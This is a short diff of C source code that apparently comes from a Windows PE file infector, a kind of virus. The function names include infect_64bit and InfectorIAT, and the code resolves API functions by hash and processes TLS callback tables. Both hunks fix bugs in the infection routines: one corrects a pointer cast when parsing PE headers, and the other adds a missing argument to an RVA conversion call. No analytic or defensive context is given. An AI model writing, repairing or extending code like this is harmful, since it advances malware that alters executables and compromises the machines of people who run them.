@@ -262,7 +262,7 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, uint32_t hash)
 
 DWORD rva_to_offset(CVector *module, DWORD rva)
 {
-   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
+   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,CVECTOR_CAST(module, uint8_t *)+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
    size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
    IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
 
@@ -350,7 +350,7 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
    if (old_tls_directory != NULL && old_tls_directory->AddressOfCallBacks != 0)
    {
       DWORD callback_rva = old_tls_directory->AddressOfCallBacks - nt_headers->OptionalHeader.ImageBase;
-      uintptr_t *callback_array = RECAST(uintptr_t *,byte_module+rva_to_offset(callback_rva));
+      uintptr_t *callback_array = RECAST(uintptr_t *,byte_module+rva_to_offset(module, callback_rva));
 
       do
       {
